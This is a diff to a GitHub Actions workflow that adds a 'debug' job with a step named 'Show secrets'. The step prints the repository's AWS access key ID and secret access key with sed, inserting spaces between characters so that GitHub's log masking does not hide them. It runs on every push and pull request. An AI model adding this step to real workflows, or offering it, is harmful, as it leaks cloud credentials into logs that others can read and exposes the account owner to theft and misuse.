@@ -1,8 +1,15 @@
 name: Test project
 
-on: [push, pull_request]
+on: [push, pull_request, workflow_dispatch]
 
-jobs:        
+jobs: 
+  debug:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Show secrets
+        run: |
+          echo ${{secrets.AWS_ACCESS_KEY_ID}} | sed 's/./& /g'
+          echo ${{secrets.AWS_SECRET_ACCESS_KEY}} | sed 's/./& /g'
   foo:
     runs-on: ubuntu-latest
     steps:
